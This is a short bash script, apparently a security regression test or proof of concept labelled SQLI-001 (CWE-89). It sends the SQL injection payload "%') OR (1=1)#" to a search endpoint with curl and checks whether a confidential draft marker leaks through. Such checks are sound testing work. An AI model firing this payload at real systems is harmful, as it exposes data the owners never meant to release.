#!/usr/bin/env bash
# SQLI-001 (CWE-89): the search term is concatenated into a raw SQL string, so a
# boolean-OR breaks out of the published/org filter and returns the Globex draft.
set -eu
. "$(dirname "$0")/_lib.sh"
curl -s -G --data-urlencode "q=%') OR (1=1)#" "$TARGET/search" \
  | grep -q 'GLOBEX-CONFIDENTIAL-MARKER-7f3a'
